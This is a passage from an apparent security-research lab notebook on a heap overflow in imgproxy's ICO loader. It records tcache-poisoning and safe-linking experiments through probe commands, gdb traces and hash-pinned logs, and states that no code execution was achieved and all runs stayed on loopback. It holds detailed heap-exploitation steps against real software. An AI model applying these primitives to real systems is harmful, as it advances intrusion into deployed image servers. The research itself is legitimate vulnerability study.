`pos = actual_data + 18` (the live tcache `next` field), decodes with
glibc 2.39 safe-linking (`ptr ^ (pos >> 12)`), patches `next` with an encoded
chosen target, then calls `malloc(0x20)` twice from the inferior. The patch
and both malloc calls are debugger-forced; wire input supplies only the ICO.

Commands (from `provision/`):

    python3 ico_gdb_tcache.py ./imgproxy-vuln \
      ../../libvips2shell/build-vuln-plain/libvips w6v9 2 0x61000000 30
    python3 ico_gdb_tcache.py ./imgproxy-vuln \
      ../../libvips2shell/build-vuln-plain/libvips w6v27 2 '($pos + 0x10)' 30
    python3 ico_gdb_tcache.py ./imgproxy-icofixed \
      ../../libvips2shell/build-vuln-plain/libvips w6fixed1 2 '($pos + 0x10)' 30

Cured raw logs (others were throwaways and were deleted):

| Log | SHA-256 | Observation |
| --- | --- | --- |
| `http-ico-w6v9.log` | `b16751c67a16a639d07ca82311a9974aa5229cba8798441d1c092284a2cd6700` | `pos=0x7fff880b0480`, live `next=0x7ff877f38150` decoding to `0x7fff880b01e0`; wire body's raw `next=0x4141414141414141`; after patch first gdb `malloc(0x20)` returned the victim `0x7fff880b0480`, `tcache->entries[1]=0x61000000`, `count1=6`; second `malloc(0x20)` hit SIGSEGV in `tcache_get_n` (`malloc.c:3186`) |
| `http-ico-w6v23.log` | `482ef01e7723711e604f4c7bd06baa29345a8664f83b468226955cf09da0c33b` | negative: `info proc mappings` shows `0x609b000-0x80fe000` rw, but gdb reports `Cannot access memory at address 0x61000000`; the fault in w6v9 is target unmapped, not a safe-link bypass |
| `http-ico-w6v27.log` | `681fe8aeb779bdfb1d772bc97955f5cbb50e43207a99f4e79fc3be785a4d82d4` | mapped heap-derived target `0x7fff700580e0`: first malloc returned victim `0x7fff700580d0`, `tcache->entries[1]` and second `malloc(0x20)` both returned exactly `0x7fff700580e0`, target qwords readable |
| `http-ico-w6v30.log` | `b4372941b2b4d723b9ffb2560d20e20448ad8346aa5f2995915e2f22ca3ee8e8` | same mechanic at `0x7fffa4058400`, second malloc returned the chosen address |
| `http-ico-w6fixed1.log` | `47bab70fc30d850975bb6e487878b6a13539746e8cba8afe27d42c3418f0c906` | benign 200, hostile HTTP 500 `ICO image data is too large`, breakpoint installed with zero hits |

Safe-link arithmetic check from W5's committed log: `pos>>12 = 0x7fff7c03e`,
`0x00007ff883f42c4e ^ 0x7fff7c03e = 0x7fff7c03ec70`. The raw wire value
`0x4141414141414141` therefore decodes to a noncanonical address; W5's claim
remains metadata control, not controlled allocation. Heap addresses differed
between runs (`0x7fff880b0480`, `0x7fff800019a0`, `0x7fffa40583de`), so no
wire-only safe-link key is established. No code-pointer write, marker, command
or r5 is claimed; witness W200 replayed and graded this claim (report W200
section). Ports were free after the runs; no probe left loopback.

### Clean-archive replay (12:31-12:33Z)

From `git archive 314fa5d lab/frontier/imgproxy2shell` into `/tmp/w6-replay`,
with only the two gitignored CLI binaries symlinked from the live provision
tree and libvips referenced by absolute path, the committed probe reproduced
the layout-dependent mechanic. `w6replay3`: `pos=0x7fff9803f29e`, first
gdb-forced `malloc(0x20)` returned victim `0x7fff9803f2b0`, patched encoded
target `0x7ff867fa72ff` for chosen `0x7fff9803f2c0`; `tcache->entries[1]` and
the second `malloc(0x20)` both returned exactly `0x7fff9803f2c0`, with readable
qwords there. `w6replay6` repeated it at `0x7fff9003f2c0`. The other five
attempts hit the top-chunk or live-data layout and are preserved as negatives.
The ICO-fixed binary returned HTTP 500 with zero breakpoint hits. The
throwaway tree was removed; replay logs were not committed. Same honest
stochasticity limit as W5: this is a debugger-assisted mechanic, not a
wire-only controlled allocation.

## W7 — no wire-visible heap leak on the ICO path (2026-11-24 12:51-12:54Z, witness W202 ESTABLISHED AS LABELED)

Source-bound negative, checked against the pinned bytes in this tree:
`provision/imgproxy-4.0.0/vips/vips.c`
(`sha256=a0e7720b87ce79c24d69c56ebde7aed41391430811cacea3b1335518eda48d3a`)
`:1302-1315` loops `vips_source_read` until the whole `len` is consumed and
returns 1 only then; on a short source it returns at the first `n <= 0`.
`provision/imgproxy-4.0.0/vips/icoload.c`
(`sha256=2eabd58d1e6c14439af7a7e22196df2ea4f4b2aa82efeb1ea0844962744051dc`,
identical to the pinned v4.0.15 source) calls that function with the wrapped
`data_size = 0xfffffff5` and returns at `:161-164` when it is short, before
the PNG test at `:169` or the BMP reconstruction at `:187-219`. Therefore the
spill bytes (and the neighbouring tcache `next` carrying the safe-link key)
have no consumer that can turn them into response pixels, error text or
headers: the only code that touches them is the allocator on free. This holds
even for a PNG-magic body: `vips_pngload_buffer` is never reached unless the
source supplies all 4,294,967,185 bytes, and writing that many bytes into the
3-byte chunk cannot leave a process alive to answer the request.

Response-path check (read-only source, exact sites):
`server/middlewares.go:120-134` writes only the fixed `err.PublicMessage()` off
dev mode (`server/config.go:34,77,109`); `vips/vips.go:132-136` converts a
fixed vips error buffer; the dev-mode page (`server/error_page.go:78,150-180`)
formats function/file:line only, with no `%p`; `server/router.go:206-231`
reflects a validated request header; `handlers/processing/request_methods.go:166-231`
returns decoded integers and URL options. No reflector of heap bytes exists.
`/proc/sys/kernel/randomize_va_space` read as `2` this wake, so no constant
cross-process safe-link key either (W6 heap positions already differed).

Live bound (all four bodies ran against `imgproxy-vuln` with the pinned plain
libvips tree on 127.0.0.1 only): pattern, complete 1x1 PNG, PNG IHDR-only and
a PNG IDAT declaring 4096 bytes all died in 13-17 ms with `rc=2` and no HTTP
response; no response bytes or heap-derived log text. Probe
`provision/ico_readfull_bound.py`
(`sha256=e422a59974088057b0f89a4629c5f3526f87dac04bc9aab7163298ef8de48140`),
run from `provision/` as:

    python3 ico_readfull_bound.py ./imgproxy-vuln \
      ../../libvips2shell/build-vuln-plain/libvips w7final-pattern \
      rs:fill:16:16/plain/pattern.ico 8
    python3 ico_readfull_bound.py ./imgproxy-vuln \
      ../../libvips2shell/build-vuln-plain/libvips w7final-pngvalid \
      rs:fill:16:16/plain/pngvalid.ico 8
    python3 ico_readfull_bound.py ./imgproxy-vuln \
      ../../libvips2shell/build-vuln-plain/libvips w7final-pnglie \
      rs:fill:16:16/plain/pnglie.ico 8

| Log | SHA-256 | Observation |
| --- | --- | --- |
| `http-ico-w7final-pattern.log` | `017b0b48b8d207cbbc0bb3d6e6e440ce0430932d63796999c7b2be09a1d8a380` | `rc=2`, no response, 0.014 s; `malloc(): corrupted top size`, `SIGABRT`, `signal arrived during cgo execution` in the Go stack |
| `http-ico-w7final-pngvalid.log` | `a4c5193041fce665ee1fd6dd82dfd6c4d7dce0813b0ac2485a96e02599cbb52a` | identical outcome for a complete PNG body: PNG decode not reached |
| `http-ico-w7final-pnglie.log` | `0f16c0989715a9f49a9f700fac4907c6931f2968b3a98ebc936cd41ebde09ed6` | identical outcome for an IDAT declaring 4096 bytes: no over-read into a response |

Verdict: this closes the only plausible wire-only derivation of the safe-link
key on this loader path. Grade stays rung 4; no marker, code-pointer write or
r5 is claimed. Superseded /tmp logs and the throwaway first version of the
probe are deleted; ports were free after the runs. Witness W202 graded this
ESTABLISHED AS LABELED (below).

### Clean-archive replay (12:56-12:57Z)

From `git archive 6f8581a7 lab/frontier/imgproxy2shell` into `/tmp/w7-replay`,
with only the gitignored `imgproxy-vuln` symlinked from the live provision tree
and the plain libvips tree referenced by absolute path, the committed probe
reproduced both legs: `w7replay-pattern` (`sha256` of log
`7cbfa021df10d8bb22b67459c77340b6d96de1fe43ce87a2c388d2ef82b7df59`,
rc=2, no response, 0.066 s) and `w7replay-pngvalid`
(`2ea5e396b9335b5048c845360bdbefdd9da6dcf4307d62e4c298b4a5ba2634e5`,
rc=2, no response, 0.013 s); both logs contain `malloc(): corrupted top size`.
The first replay attempt used a wrong libvips path (`lab/libvips2shell`
instead of `lab/frontier/libvips2shell`), so the binary failed to start with
`libvips.so.42: cannot open shared object file` and `PROXY_LISTEN=FAIL`; that
harness error is preserved here, and the corrected path replayed cleanly.
Replay logs were not committed; the throwaway tree was removed. This was the
author's replay; witness W202 replayed it independently (below).

## W8 — wire-only partial tcache-next retarget (2026-11-24 13:49-14:01Z, witness W201 ESTABLISHED AS LABELED)

W7 established that a short source makes `read_full` copy only the bytes the
source has before `icoload.c:161-164` exits. W8 uses that to choose the
overflow length: a 42-byte ICO (22-byte directory + **20-byte** body) serves
10 filler bytes, a preserved little-endian `0x35` victim size at
`actual_data+10..17`, and the chosen low 16 bits `0x0000` of the live
safe-linked `next` at `actual_data+18..25`. The high six bytes, the safe-link
key and the victim size are untouched by the wire bytes: this is a relative
retarget within the same 64 KiB, **not** a chosen absolute address and not a
key derivation. No gdb write to memory is used; gdb only observes.

Pins and commands (all on 127.0.0.1:18180/18181, distinct from the W7 replay's
18080/18081):

```
cd lab/frontier/imgproxy2shell/provision
python3 replay_partial_next.py /absolute/outdir
```

`ico_partial_next.py` sha256
`f03dbc448c3ddffc61a5db7a1e1816f9b54a4d7df6c3a94d4967241992f0ca7f`;
`replay_partial_next.py` sha256
`2e69125a6742844b2a032b843e230bc87308375876e04ad64682b42c9dce6f26`.
The runner uses the pinned `imgproxy-vuln` binary and the pinned plain libvips
tree at `lab/frontier/libvips2shell/build-vuln-plain/libvips`, with
`imgproxy-icofixed` as ICO control. Result in `/tmp/w8-replay-final2`:
`W8_RESULT PASS=4 FAIL=0 PARTIAL_NEXT=3 PLAIN_SURVIVAL=2`. Layout is
stochastic: 3/6 gdb runs had the 0x35 tcache victim, 3 hit a top/live-data
layout; 2/6 plain runs survived with HTTP 500 and an alive process, 4 aborted
on the top-chunk layout. All negatives are preserved in that outdir.

Decisive observation (`http-ico-w8-gdb1.log`, sha256
`1928d10b16cbff9ad69b277c5d811022ebf1ad1607e62e2eeda4f0b8a9d3dc45`):
`base=0x7fff900580b0`, live victim `next` at `0x7fff900580d0` (tcache head,
count 7) changed from `0x00007ff86ffc7e08` to `0x00007ff86ffc0000` — only the
low 16 bits, exactly the wire value — while size stayed `0x35` before and
after. With key `pos>>12 = 0x7fff90058`, the decoded wire pointer is
`0x7fff90050058`, mapped in the same arena. The first `malloc(0x20)` returned
the victim and `GDB_TCACHE_POST head=0x7fff90050058 count=6`: the wire bytes
are now the live allocation head. `http-ico-w8-gdb3.log`
(`c3754c5e8394ca9a31adcae0f55913153927b21bd265801db800b48458f04701`) and
`http-ico-w8-gdb6.log`
(`df46e65c12a0a2213aa7c4fad60ae70405a5bc98edda623731f287533e06b883`) repeat
the same transition at different ASLR bases. Plain survivors
`http-ico-w8-plain1.log`
(`0072c82f13af4dcb00c9808e8e960d1731b4017cc6eb4db6ef4b605e9350b2a0`) and
`http-ico-w8-plain6.log`
(`4e76cdee074d144afe1ec15fc1fb0011385ebdcc8edbbf5c5b47790230e07dbe`) show
`hostile=500`, `rc=None`, process alive with no debugger attached.

Fixed controls: `http-ico-w8-fixedplain.log`
(`9445b5d26f87d95b31e6b57e6cf0c7463a4051211f5393b95e3b4014d62817c0`)
has HTTP 500 and `vips_foreign_load_ico_header: ICO image data is too large`;
`http-ico-w8-fixedgdb.log`
(`63d47ec5b346cb272ada6f59fb23e59d2b2ee0f0f52bf6b22d52f938788040b9`)
has zero `GDB_HIT` and a live process. No wire-only absolute address, no
key derivation, no code-pointer write, no marker execution and no r5.
Author finding replayed by witness W201 and graded ESTABLISHED AS LABELED
(section below). The surviving plain runs do not prove that the retargeted
head was consumed by a later allocation in an unsanitized process.

### Clean-archive replay (14:03-14:05Z)

From `git archive a9309b1c lab/frontier/imgproxy2shell` into
`/tmp/w8-archive`, with only the two gitignored CLI binaries and the
gitignored plain libvips tree symlinked from the live lab,
`python3 /tmp/w8-archive/lab/frontier/imgproxy2shell/provision/replay_partial_next.py /tmp/w8-archive-out`
returned `W8_RESULT PASS=4 FAIL=0 PARTIAL_NEXT=2 PLAIN_SURVIVAL=3`; both
fixed controls passed. Two gdb runs had the 0x35 victim with the wire low-16
change and the matching tcache head (e.g. decoded/head `0x7fff80050058`),
three plain runs survived with HTTP 500. The remaining runs kept their
top-chunk/live-data negatives in that outdir. Logs were not committed; this
is the author's clean-archive replay, not witness acceptance.

### Witness W201 — clean-archive replay (14:01-14:13Z, tape #3660)

The witness extracted `git archive 59d008f6 lab/frontier/imgproxy2shell` into
`/tmp/w201-imgproxy`, symlinked only the two gitignored CLI binaries and the
sibling `libvips2shell` tree, and found ports 18180/18181 free. Both probe
hashes (`f03dbc44…2f0ca7f`, `2e69125a…9dce6f26`) and all seven committed W8
log hashes matched exactly. Result: `W8_RESULT PASS=4 FAIL=0 PARTIAL_NEXT=4
PLAIN_SURVIVAL=3` — four of six gdb runs had the 0x35 victim at the live head
and three of six plain runs survived, against the author's 3/6 and 2/6;
layout is stochastic and all negatives were kept in `/tmp/w201-out`.

Decisive `w8-gdb5.log`: base `0x7fff900583d0`, actual `0x7fff900583de`, size
`0x35` before and after; `next` at base+0x20 went from `0x00007ff86ffc8128`
to `0x00007ff86ffc0000`, with the high six bytes intact. Key
`pos>>12=0x7fff90058`; decoded `0x7fff90050058` equalled the `GDB_TCACHE_POST`
head at count 6 after a natural `malloc(0x20)` returned the victim.
`gdb1` repeated the transition at another base (decoded == head
`0x7fffa00b00b0`). The gdb script used only `set $var` and `x/`, wrote no
memory, and reached malloc by `continue`, not `call`.

Counterexample hunt: three fresh runs with `LOW=0x1234` wrote exactly `0x1234`
into the spill target's low 16 bits (e.g. `0x00007fff8c000400` →
`0x00007fff8c001234`, high bytes preserved), showing the bits follow the
wire rather than a natural zero; on those layouts the spill was not the live
head, so no retarget occurred. gdb3 (malloc breakpoint hit `0x1f6efc`, no
fields) and gdb6 (pre-size `0x25` → `0x35`) were correctly rejected and
preserved. Fixed controls: plain hostile HTTP 500 with
`ICO image data is too large`, gdb zero GDB_HIT, benign 200, process alive.
Limit preserved: the following `malloc(0x20)` did NOT return the decoded
head (`M2_RET` differs), so no consumption by a later allocation in an
unsanitized process is proved. Verdict ESTABLISHED AS LABELED, no
contradiction, no grade change, no r5; W7's no-wire-only-key boundary stays
closed.

### Witness W202 — clean-archive replay (2026-11-24, tape #3685)

Witness verdict on #3644 / commit `21a233bc`: W7's "no wire-visible heap leak"
negative is ESTABLISHED AS LABELED. Clean room:
`git archive 21a233bc lab/frontier/imgproxy2shell` → `/tmp/w202-imgproxy`,
only the two gitignored CLI binaries and the sibling `libvips2shell` tree
symlinked. Probe sha256
`e422a59974088057b0f89a4629c5f3526f87dac04bc9aab7163298ef8de48140` and all
three committed W7 log hashes (`017b0b48…a380`, `a4c51930…bb52`,
`0f16c098…ed6e`) matched exactly. The witness also fetched fresh upstream
bytes — v4.0.0 codeload tarball `02190571…`, `vips.c` `a0e7720b…` and
`icoload.c` `2eabd58d…` — and confirmed the pinned source hashes rather than
trusting the vendored copy.

Live: all three probes rc=2, status `-`, length 0, `RemoteDisconnected` in
0.013-0.064 s; each log had `malloc(): corrupted top size`, SIGABRT and
`signal arrived during cgo execution`; no chosen `5a5b5c5d` bytes. Fixed
control on the same pattern: HTTP 500 `ICO image data is too large`, process
alive (rc=None). ASLR=2. Response sites checked at pinned bytes:
`server/middlewares.go:120-134` fixed public message, `server/vips/vips.go:132-136`
fixed error buffer, `server/error_page.go:150-180` no `%p`,
`server/router.go:206-231` header-derived IDs,
`server/handlers/processing/request_methods.go:166-231` integers/URL options.
No heap-byte or pointer reflector. Replay logs are not byte-identical to the
committed logs because Go goroutine states and m/thread IDs vary; that is
runtime scheduling, not a behavioral difference. Verdict ESTABLISHED AS
LABELED, no contradiction, no grade change, no r5; the no-wire-only-key
boundary stays closed and W201 remains the ceiling. Ports 18080/18081 free.

## W9 — no natural allocation through the wire head (2026-11-24 16:09-16:20Z, witness W204 ESTABLISHED AS LABELED)

Question left open by W8/W201: the wire-derived tcache head existed at count 6
after the first natural `malloc(0x20)`, but the next measured malloc did not
return it. Hypothesis: intervening frees bury that head, or the process aborts
before the next 0x20 allocation. Bounded test: observe every subsequent
natural `malloc(0x20)` in the plain process, with no debugger writes and no
forced calls.

Probe `provision/ico_post_poison_trace.py` sha256
`563f5f7a44e5aacd43c12132eb9cdb0cc39fbfec1d1cbbb02e6aa20aba34e6f0`; it is
the W8 probe (`ico_partial_next.py` sha256
`f03dbc448c3ddffc61a5db7a1e1816f9b54a4d7df6c3a94d4967241992f0ca7f`) with GDB
prints added for the post-write decoded head, up to ten later malloc returns,
tcache head/count after each, and the observing thread, plus a pinned lab
path. Curated victim logs:
`provision/http-ico-w9-victim1.log` sha256
`eece51a1119804cff430aa307cca01f9a8000d92e976afb3b96e8745e898315e`,
`provision/http-ico-w9-victim2.log` sha256
`7711dbe350e556acf82e4b515845377bc830c5e8bfe0f5a4737e7c68d4e82993`.
Ports 18180/18181 were free before use; all traffic stayed on 127.0.0.1.

Command shape (49 runs, tags `w9a1`, `w9b1-8`, `w9c9-24`, `w9d25-48`):

```
W8_OUTDIR=/tmp/w9-out python3 ico_post_poison_trace.py TAG 0x0 20 2 gdb
```

Pinned plain `imgproxy-vuln`, sibling plain libvips tree, 42-byte ICO with a
20-byte body, `LOW=0`, size `0x25`, two benign preloads. Result: 10 of 49 runs
put the poisoned 0x35 chunk at the live tcache head (`head == base+0x20`); 8
of those carry the post-write decode added before those runs. In all 8, M1
returned the victim, `GDB_TCACHE_1 head` equalled `GDB_WIRE_DECODED` at count
6, and `free(): invalid next size (fast)` / SIGABRT followed before any second
`malloc(0x20)`; all 10 victim layouts aborted the same way. Seven non-victim
runs survived the hostile request with HTTP 500 and a live process, but their
spill was not at the live head. Zero runs returned the wire-decoded pointer
from a later allocation. Excerpt from `http-ico-w9-victim1.log`:

```
GDB_TCACHE_PRE head=0x7fff7803ef10 count=7
GDB_WIRE_DECODED 0x7fff7803803e RAW 0x7ff887f40000 POS 0x7fff7803ef10
GDB_M1_HIT size=0x20 thread=12
GDB_M1_RET 0x7fff7803ef10
GDB_TCACHE_1 head=0x7fff7803803e count=6
free(): invalid next size (fast)
Thread 12 "imgproxy-vuln" received signal SIGABRT, Aborted.
GDB_M2_HIT size=0x48a77 thread=12
GDB_M2_RET (nil)
```

The two `GDB_M2_*` lines are script output at the SIGABRT stop with a stale
`$rdi`; they are not a `malloc(0x20)` hit. The aborting `free()` call and
chunk were not identified, so this records the observed allocator blocker,
not a stronger causal claim. Layout is stochastic and ASLR-dependent; the
other 39 logs (including top-chunk aborts and non-head layouts) remain in
`/tmp/w9-out` and are not retried into existence. No fixed-binary control was
rerun here; W8/W202 already measured it. Grade stays rung 4: no wire-only key,
no marker, no code-pointer write, no r5. Witness W204 replayed this on a clean
archive and graded it ESTABLISHED AS LABELED; see below.

### Witness W204 — clean-archive replay (2026-11-24, tape #3734)

Witness verdict on #3719 / commit `5af51c33`: W9's measured allocator blocker
is ESTABLISHED AS LABELED. Clean room:
`git archive 5af51c33 lab/frontier/imgproxy2shell` → `/tmp/w204-imgproxy`,
own outdir `/tmp/w204-out`. Probe sha256
`563f5f7a44e5aacd43c12132eb9cdb0cc39fbfec1d1cbbb02e6aa20aba34e6f0`, both
curated victim logs, the benign ICO, the plain `imgproxy-vuln` binary
(`ea2317df…d8165d`) and the fixed ICO binary (`58d0ab01…18ea`) all matched
exactly. Ports 18180/18181 were free after. GDB source was read verbatim:
prints, breakpoints, `finish` and `continue` only — no `set` memory writes and
no forced call.

Sixteen `LOW=0` runs and six `LOW=0x1234` runs under GDB, plus fixed-binary
and plain controls, gave three wire-head victims. `w204a1`: base
`0x7fff70058070`, pre head `POS 0x7fff70058090`, `next`
`0x00007ff88ff27e48` → `0x00007ff88ff20000`, decoded/head1
`0x7fff70050058` (count 6). `w204a11`: base `0x7fff800583d0`, `next …8128`
→ `…0000`, decoded/head1 `0x7fff80050058`. `w204b1` (`LOW=0x1234`):
`next …539d` → `…1234`, decoded/head1 `0x7fff88019229`. In all three M1
returned the victim, `decoded == raw XOR (pos >> 12)` exactly, the high six
bytes and the tcache key were unchanged, then `free(): invalid next size
(fast)` / SIGABRT; `M2_HIT` held stale `$rdi` (not `0x20`) and `M2_RET` was
nil — no later allocation returned the decoded pointer. Non-victim layouts
(`a2`, `a10`) survived with HTTP 500 and a genuine `0x20` M2 returning the
pre head, never the decoded pointer. The `LOW=0x1234` runs independently
confirm wire control of the low 16 bits, not a natural zero. Fixed binary:
zero GDB_HIT, HTTP 500 `ICO image data is too large`, alive in both modes.
Victim rate 3/22 versus the author's 10/49 is stochastic; all negatives were
preserved in `/tmp/w204-out` and are not retried into existence. Verdict
ESTABLISHED AS LABELED, no contradiction, no grade change, no r5; W201
remains the ceiling.

## W10 — aborting free identified; size-preserving body never consumed (2026-11-24 18:11-18:20Z, author, unwitnessed)

Question left open by witness W204: W9 recorded the allocator blocker
(`free(): invalid next size (fast)`) but did not attribute it to a freeing
call or chunk. Both probes below reuse `ico_post_poison_trace.py`
(`sha256=563f5f7a44e5aacd43c12132eb9cdb0cc39fbfec1d1cbbb02e6aa20aba34e6f0`)
verbatim and replace only its GDB command script; GDB prints memory and
backtraces, writes no memory and forces no call. All traffic stayed on
127.0.0.1:18180/18181; those ports were free before use.

`provision/ico_free_attribution.py` sha256
`9f88ac4e030af4208700d5f589f4951cefb4b1f2f39df069da5cfd9d4446940d`;
after the write it breaks on every natural `free()` and prints `$rdi`, the
chunk size at `$rdi-8`, the caller return address and `bt 3`. Command shape
(eight runs `w10c10`-`w10c17`):

```
W8_OUTDIR=/tmp/w10-out python3 ico_free_attribution.py w10c13 0x0 20 2 gdb 0x25
```

Pinned plain `imgproxy-vuln`, 42-byte ICO, 20-byte body, `LOW=0`, two benign
preloads. Two runs had the wire-head layout and aborted identically. In
`http-ico-w10-attr1.log` sha256
`76ec9157ac4506a8c8afcefd4b82cf9a8cd2a0811283a98b78b8a457215d2ea4`:
`GDB_TCACHE_PRE head=0x7fff8803ef10 count=7`,
`GDB_WIRE_DECODED 0x7fff8803803e RAW 0x7ff877fb0000 POS 0x7fff8803ef10`,
M1 returned `0x7fff8803ef10`, head became `0x7fff8803803e` at count 6, then
`GDB_FREE ptr=0x7fff8803ef10 chunksize=0x25 ret=0x7ffff7902653`, header
`0x7fff8803ef00: 0x5b5a5d5c5b5a5d5c 0x0000000000000025`, frames
`#1 g_hash_table_unref ()` and `#2 vips_argument_table_destroy
(../src/libvips-8.18.2/libvips/iofuncs/object.c:573)`, then
`free(): invalid next size (fast)` and SIGABRT. `http-ico-w10-attr2.log`
sha256
`98f5551321d161a86318e709639dd2252c46f44524f100e504f7377b9ca47e5e`
repeated it at `0x7fff8c0b0610` with decoded `0x7fff8c0bc0b0` and the same
two frames. W9's body writes `SIZE=0x25` (the wrapped allocation size) at
`body[10:18]`, over the victim chunk's original `0x35` size field; the free
of the just-returned victim therefore faults on the rewritten size.

`provision/ico_wire_head_consume.py` sha256
`c9f315a15e9f69276fb6537d9014c299caec3c87766c96624a177ed950801df9`
observes ten natural `malloc(0x20)` returns and compares each with `$wire`.
With `SIZE=0x35` the wire bytes preserve the victim size field. Twenty runs
(`w10d20`-`d27`, `w10e30`-`e41`) had no `WIRE=1` line. In
`http-ico-w10-size35-victim.log` sha256
`902b1958da7887dd8deb1ade6cab2715b4968774eb303d59e258842261311037`
(`w10e41`): pre head/`POS 0x7fffa401e200` count 7, raw `0x7ff85bfb0000`,
decoded `0x7fffa401401e`; M1 returned `0x7fffa401e200`; the victim was
freed with `chunksize=0x35` and no abort; M2-M6 returned
`0x7fffa401bfd0`, `0x7fffa401cd40`, `0x7fffa4020480`, `0x7fffa401cd40`,
`0x7fffa4020480` (`WIRE=0` throughout), while the GDB `tcache` expression
still printed `head=0x7fffa401401e count=6`. Those mallocs were `g_realloc`
calls in the reported thread; the probe could not establish that they
consumed the poisoned tcache, so no wire-head consumption is claimed. Six
size-preserving runs (`e30`, `e33`, `e34`, `e39`, `e40`, `e41`) survived the
hostile request with HTTP 500 and a live process; the other layouts and all
non-consumptions remain in `/tmp/w10-out` and are not retried into
existence. No fixed-binary control was rerun; W8/W202 and W204 already
measured it. Grade stays rung 4: no wire-only key, marker, code-pointer
write or r5. Author finding, unwitnessed; W204's verdict on W9 is unchanged.

## W11 — poisoned head is transient, not cross-thread (2026-11-24 18:44-18:50Z, author, unwitnessed)

Question left open by W10: GDB printed the wire-decoded tcache head after a
natural malloc, but no later malloc returned it. The new probe reuses
`ico_post_poison_trace.py`
(`sha256=563f5f7a44e5aacd43c12132eb9cdb0cc39fbfec1d1cbbb02e6aa20aba34e6f0`)
verbatim and replaces only its GDB script; GDB reads registers and the tcache
struct, writes no memory and forces no call. All traffic stayed on
127.0.0.1:18180/18181.

`provision/ico_tcache_thread_probe.py` sha256
`d2d2ecb180d5e0427366bad5d06ec169afdcc14484957dcf5c9cc1226d0e021c`
prints, at each natural `malloc(0x20)` breakpoint and after its `finish`,
`$_thread`, `tcache`, `tcache->entries[1]` and `tcache->counts[1]`.
Command shape (`LOW=0`, 20-byte body, two benign preloads, `SIZE=0x35`):

```
W8_OUTDIR=/tmp/w11-out python3 ico_tcache_thread_probe.py w11c4 0 20 2 gdb 0x35
```

`http-ico-w11c4.log` sha256
`802c0b94381505abff78ebc9c2c089b78ddae1a1d9bb7fc703a4b8780348e0ac`:
`GDB_TCACHE_PRE head=0x7fff8003ef10 count=7 thread=9 tcache=0x7fff800008e0`,
`POS=0x7fff8003ef10`, `GDB_WIRE_DECODED 0x7fff8003003e`; M1 hit head
`0x7fff8003ef10`, returned it, and `M1_TCACHE_AFTER head=0x7fff8003003e
count=6`; M2 hit, in the same thread and at the same `tcache` address, head
`0x7fff8003cce0 count=7`, returned that chunk, and `M2_TCACHE_AFTER`
head=`0x7fff8003003e` count=6; M3-M6 repeated with `0x7fff8003da50` and
`0x7fff80041190`. Every `WIRE=0`. `http-ico-w11a1.log` sha256
`93acd9d67371fd99aa01debe0ee705dde2d4f8ad119d1c0fb1b034fa8985c736` and
`http-ico-w11a2.log` sha256
`44318a15c31177d67cd325b483fd78d14ec784337606ce53fb0781282a3309d0`
repeated the transition at other bases and threads. The poisoned pointer is
the second link in bin 1: it becomes the head only after a malloc, then a
natural free pushes another chunk before the next malloc. The W10
tcache/TLS discrepancy is timing, not a cross-thread read; no consumption
is established. Non-victim layouts (`w11b1`-`b3`, `c1`-`c3`, `c5`-`c6`)
aborted on the top chunk with `RAW (nil)` and are preserved in
`/tmp/w11-out`, not retried into existence. Grade stays rung 4; author
finding, unwitnessed; W204's verdict on W9 is unchanged.

### W11b — second-request attempt never reached a poisoned head (2026-11-24 18:50-18:52Z, author, unwitnessed)

`provision/ico_post_request_consume.py` sha256
`11586943663317277978c871f9d85dc2b066f5afabd4641d5807ae7582e60bcf`
keeps the W9 probe and a twenty-malloc observation script, then issues a
second benign GET on 127.0.0.1:18180 after the hostile GET (via the probe's
post-hostile `sleep(0.3)`). In six samples (`w11e1`-`w11e6`) the second GET
reached a survivor twice (`e2`, `e4`) but the spill target was away from the
live head (`GDB_WIRE_DECODED 0x4067` / `0x67`), so those runs say nothing
about the poisoned chain. `http-ico-w11b-e2.log` sha256
`fa33f1215004c6a3d3c544f98c9be11464299784fca2ae6a1b666d0d31da8ac7`
records twenty natural `malloc(0x20)` returns in two threads, all `WIRE=0`.
In twelve more samples (`w11f1`-`f12`) several had the victim layout, but the
second GET failed; in six final samples (`w11g1`-`g6`) with a gated
`vips_foreign_load_ico_header` breakpoint, `g4` again had the victim layout
(`head/POS 0x7fffa40583f0`, decoded `0x7fffa4054058`) but the second GET
returned `RemoteDisconnected`: the twenty-malloc script had already reached
`quit`, killing the process. `http-ico-w11b-g4.log` sha256
`ebcb231e8b33ce7ba4cd56d4dce8b4999ae2d268bf1ffb8cf228531b12eee710`.
So the second-request route is untested against a poisoned head, not
negative evidence of consumption; all runs and failures are preserved in
`/tmp/w11-out`. Grade stays rung 4; W204's verdict on W9 is unchanged.

## W12 — gated second GET reaches a poisoned head; no wire-pointer allocation (2026-11-24 20:31-20:44Z, author, unwitnessed)

W11b's fixed-delay second GET never reached a poisoned head and its
twenty-malloc script quit before the request arrived. `provision/ico_second_get_gated_py.py`
sha256
`708b669ad1cc62b889ac979b73afe67b0dfe40703d43a392deb326cbe6edf581`
keeps the W9 probe and replaces its GDB script with GDB Python breakpoints:
an internal breakpoint at `malloc(0x20)` installs a `gdb.FinishBreakpoint`;
both return False (never stop the inferior, never call a function), print
`$rax` and tcache state, and touch a marker file when `head == wire` is seen
after a malloc. Values are read through `p/x` text because this GDB's Python
API rejects casts from pointer-typed registers. The Python side polls that
marker at 2 ms and sends a benign GET to the same live imgproxy process.
`W12_GOMAXPROCS=1` sets the Go processor count in the lab process only. No
inferior memory write and no forced call; traffic stayed on
127.0.0.1:18180/18181, free before and after.

Ninety-eight runs (62 default, 36 with `GOMAXPROCS=1`) used the pinned plain
`imgproxy-vuln` binary, `LOW=0`, 20-byte body and `SIZE=0x35`. The gate fired
in eight: `p44`, `p48`, `p54`, `p57`, `p60`, `p63`, `p64` (default) and `g97`
(`GOMAXPROCS=1`). In four (`p44`, `p48`, `p54`, `p63`) the allocator aborted
with `malloc(): unaligned tcache chunk detected` before the second GET was
served. In four (`p57`, `p60`, `p64`, `g97`) the second GET returned HTTP 200
and 379 natural `malloc(0x20)` calls were observed; every `WIRE=0`.
`http-ico-w12-p57.log` sha256
`880ce71225ed520fefea0ee0efb6bf716bac8cdced3dcb903651132e1b77c428`:
victim thread 11, pre head/`POS` `0x7fff840b0610` count 7, decoded head
`0x7fff840b40b0` count 6 after M1; later hits ran on threads 11, 14, 3 and 7
and no allocation returned the decoded pointer. `http-ico-w12-g97.log`
sha256 `7d4f49d26a9807c613fa3aa17e1d07853dbc41ca0954f4782326b5fec4f88a93`
with `GOMAXPROCS=1`: victim thread 6, decoded head `0x7fff94054057`, second
GET mallocs mostly on thread 5 with `tcache=0x7fff980008e0`. `http-ico-w12-p44.log`
